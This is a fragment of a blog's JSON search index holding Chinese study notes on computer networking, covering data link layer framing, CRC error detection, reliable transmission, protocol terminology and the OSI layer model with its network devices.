    "content": "链路层  链路（Link）：两个结点间的物理线路  数据链路：把实现通信协议的硬件和软件，加到链路上  封装成帧：加上帧头 帧尾  差错检测：帧尾的检验码  可靠传输：接收方发现帧验证错误，丢弃该帧而不接受广播通道链路：将目标地址、源地址写入帧头共享式局域网信号碰撞问题：接入控制协议 CSMA/CD封装成帧            1字节      1字节      1字节      2字节      &lt;1500字节      2字节      1字节                  标志（开始）      地址      控制      协议      数据      FCS      标志（结束）              帧头                    帧头             帧尾      帧尾        帧定界：          帧头帧尾      MAC没有帧头定界标志，用物理层的前导码作为其帧开始标志      帧间间隔（96bite发送时间）作为标志        透明传输：数据链路层 对上层交付的数据没有任何限制，就如同透明的一样          帧中出现数据与定界符一致，将导致接收方识别错误信息，不能实现透明      发送前扫描，将相似的数据添加转义 【面向字符类型：1字节，值27】【面向比特类型：每五个比特1插入一个0】        最大传输单元 MTU，数据部分应该尽可能大些，但为差错检查等数据链路层功能的保证，设定的值差错检测  基本概念：          比特差错：比特在传输过程中可能发生的差错，1→0,0→1      误码率（BER，bit error rate）= 传输错误的比特 / 总比特      使用错误检测码 检验是否发生了错误        奇偶校验          使整个数据（包括检验位）中“1”的个数为奇数 / 偶数；      出现偶个数误码，无法检出        循环冗余校验（CRC，cyclic redundancy check）          双方约定的生成多项式G(x)，必须包含最低次项      发送方：计算出冗余码，添加到待传输数据后面      接收方：使用多项式计算数据，判断是否产生误码      漏检率极低，只能检测出发生差错，而不能定位      G(x) = x^4 +x^2 +X^1 + 1  \t = 1*x^4 + 0*x^3 + 1x^2 + 1x^1 + 1*x^0\t = 生成多项式各项系数构成的比特串：10111发送方：[ 待传输数据bit + G(x)最高次个0（4个0）]÷生成多项式各项系数构成的比特串 = 商 ···· 余数发生的数据：待传输数据bit + 补全的余数接收方：[ 接收数据 + 余数 ] ÷ 生成多项式各项系数构成的比特串 = 商 ···· 0 才是正确的可靠传输服务​\t当发生误码时，对帧的操作，取决于向上层提供的服务类型。  不可靠传输服务：仅仅丢弃（有线链路中使用，出现误码由上层负责）  可靠传输服务：检测到误码发生的位置（无线链路必须提供）其它层级也可使用可靠传输服务不仅仅局限于数据链路层，其他层级也可能出现传输差错            比特差错      分组丢失      分组失序      分组重复                  数据链路层                           网络层 IP协议：无连接、不可靠运输层 TCP协议：连接、可靠运输层 UDP协议：无连接、不可靠可靠传输的实现机制​\t【三种方式，待补充】"
  },
  
  {
    "title": "2. 计算机网络用语",
    "url": "/posts/2.%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD/",
    "categories": "计算机网络",
    "tags": "computerNetwork",
    "date": "2022-06-12 00:00:00 +0800",
    





    
    "snippet": "专业术语实体协议  控制两个对等实体的逻辑通信规范的集合  三要素：语法、语义、时序",
    "content": "专业术语实体协议  控制两个对等实体的逻辑通信规范的集合  三要素：语法、语义、时序"
  },
  
  {
    "title": "1. 计算机网络分层",
    "url": "/posts/1.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%88%86%E5%B1%82/",
    "categories": "计算机网络",
    "tags": "computerNetwork",
    "date": "2022-06-10 00:00:00 +0800",
    





    
    "snippet": "网络分层模型OSI：开放式系统互联【物理链路层：物理层+链路层 – Link】【内核态】  物理层：bit，①物理接口，②怎样的信号表示比特  数据链路层：帧，①标识主机MAC，②识别MAC与数据地址访问媒介【网络层 – IP ICMP ARP】【内核态】  网络层：包，IP地址访问【传输层 – TCP UDP】【内核态】  传输层：段，不同主机用户进程的数据通信【应用层 – HTTP FT...",
    "content": "网络分层模型OSI：开放式系统互联【物理链路层：物理层+链路层 – Link】【内核态】  物理层：bit，①物理接口，②怎样的信号表示比特  数据链路层：帧，①标识主机MAC，②识别MAC与数据地址访问媒介【网络层 – IP ICMP ARP】【内核态】  网络层：包，IP地址访问【传输层 – TCP UDP】【内核态】  传输层：段，不同主机用户进程的数据通信【应用层 – HTTP FTP DNS ..】【用户态】  会话层：数据，应用之间的通信机制  表示层：数据，信息语法问题  应用层：数据，进程间通信、提供网络和用户应用各层传输设备【应用层 -（网关）- 传输层 - 网络层（路由器） - （交换机） - 数据链路层（网桥） - 物理层（集线器、中继器）】  网关：          实现复杂网络互连设备      仅用于 高层协议不同的网络 互通      可用于广域网，也可用于局域网        路由器：路由选择、存储转发；隔离冲突域+广播域  交换机：          识别MAC地址信息，并进行转发      保存一份地址表，包括 MAC地址+端口      隔离冲突域，不隔离广播域        网桥：          将两个LAN连接，根据MAC地址转发 帧      隔离冲突域，不隔离广播域        集线器：纯硬件设备，连接网络终端  中继层：延长bite在网络传输距离透明性？            [前导码]      [ETH]      [HTTP]      [TCP]      [IP]      [ETH]                  [物理层]      [数据链路层]      [应用层]      [运输层]      [网络层]      [数据链路层]                            HTTP报文                                                        TCP报文段                                                        IP数据报                            帧                                          字节流                                         "
  }
  
]

